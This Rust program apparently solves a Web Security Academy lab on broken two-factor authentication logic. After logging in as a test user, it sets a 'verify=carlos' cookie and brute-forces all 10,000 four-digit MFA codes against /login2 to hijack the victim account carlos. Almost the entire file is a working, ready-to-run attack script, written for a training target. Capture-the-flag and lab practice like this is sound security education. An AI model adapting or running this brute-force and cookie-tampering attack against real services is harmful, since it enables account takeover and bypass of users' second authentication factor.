/**********************************************************
*
* Lab: 2FA broken logic
*
* Hack Steps: 
*      1. Obtain a valid session
*      2. Fetch the login2 page
*      3. Start brute forcing the mfa-code of carlos
*      4. Fetch carlos profile
*
***********************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a6800ee03e72937804bfe78006800d4.web-security-academy.net";

lazy_static! {
    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Obtaining a valid session.. ");
    flush_terminal();

    let login = login_as_wiener();
    let session = get_session_from_multiple_cookies(&login);

    println!("{}", "OK".green());
    print!("⦗2⦘ Fetching the login2 page.. ");

    // Must fetch the login2 page to make the mfa-code be sent to the mail server
    fetch_with_session("/login2", &session);

    println!("{}", "OK".green());
    println!("{}", "⦗3⦘ Start brute forcing the mfa-code of carlos.. ");

    let carlos_session = brute_force_mfa_code(&session);

    print!("\n{}", "⦗4⦘ Fetching carlos profile.. ");

    fetch_with_session("/my-account", &carlos_session);

    println!("{}", "OK".green());
    print_finish_message();
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn login_as_wiener() -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}; verify=carlos"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn brute_force_mfa_code(session: &str) -> String {
    let mut new_session = String::new();
    let range: Vec<i32> = (0..10000).collect();

    for (counter, code) in range.iter().enumerate() {
        if let Ok(response) = post_code(&session, code) {
            if response.status().as_u16() == 302 {
                print_correct_code(code);
                new_session = get_session_cookie(&response);
                break;
            } else {
                print_progress(counter, &code);
            }
        } else {
            print_failed_code(code);
        }
    }
    new_session
}

fn post_code(session: &str, code: &i32) -> Result<Response, Error> {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login2"))
        .header("Cookie", format!("session={session}; verify=carlos"))
        .form(&HashMap::from([("mfa-code", format!("{code:04}"))]))
        .send()
}

fn get_session_from_multiple_cookies(response: &Response) -> String {
    let headers = response.headers();
    let mut cookies = headers.get_all("set-cookie").iter();
    let session_cookie = cookies.nth(1).unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", session_cookie)
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn print_correct_code(code: &i32) {
    println!("\n🗹 Correct Code: {}", format!("{code:04}").green());
    flush_terminal();
}

fn print_progress(counter: usize, code: &i32) {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
    print!(
        "\r❯❯ Elapsed: {} minutes || Trying ({}/10000) {} => {}",
        elapsed_time.yellow(),
        counter + 1,
        format!("{code:04}").blue(),
        "Wrong".red()
    );
    io::stdout().flush().unwrap();
}

fn print_failed_code(code: &i32) {
    println!(
        "\r⦗*⦘ {} => {}",
        format!("{:04}", code),
        "REQUEST FAILED".red()
    );
    flush_terminal();
}

fn print_finish_message() {
    let elapased_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
    println!("🗹 Finished in: {} minutes", elapased_time.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
